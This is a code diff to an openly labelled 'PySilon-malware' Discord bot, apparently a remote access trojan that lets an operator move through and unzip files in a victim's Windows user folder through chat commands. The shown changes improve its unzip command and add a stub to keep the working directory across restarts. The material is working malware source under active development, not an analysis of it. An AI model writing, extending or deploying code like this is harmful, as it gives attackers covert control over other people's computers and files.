@@ -8,6 +8,8 @@ import requests
 import os
 
 working_directory = ['C:', 'Users', getuser()]
+def save_working_dir_to_file():
+    print("work in progress") #! TODO: Will be used to remember working directory ever after restart, function should be called every time working dir changes
 
 @client.command(name='download')
 async def file_downloading(ctx, file_to_download=None):
@@ -148,9 +150,11 @@ async def file_uploading(ctx, argument=None, name_of_file=None):
 
 @client.command(name="unzip")
 async def unzip_command(ctx, filename=None):
+    await ctx.message.delete()
+
     if filename != None:
-        await ctx.message.delete()
-        await unzip(ctx, filename)
+        if os.path.exists('/'.join(working_directory) + '/' + filename): await unzip(ctx, '/'.join(working_directory) + '/' + filename)
+        elif os.path.exists(filename): await unzip(ctx, filename)
     else:
         embed = discord.Embed(title="📛 Error",description=f'```Syntax: .unzip <path/to/zip_file>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
@@ -258,7 +262,6 @@ async def list_working_directory(ctx):
 @client.command(name="pwd")
 async def print_working_directory(ctx):
     await ctx.message.delete()
-
     embed = discord.Embed(title=f"🟣 System",description=f"Current directory: `{'/'.join(working_directory)}`", colour=discord.Colour.purple())
     embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
     await ctx.send(embed=embed)
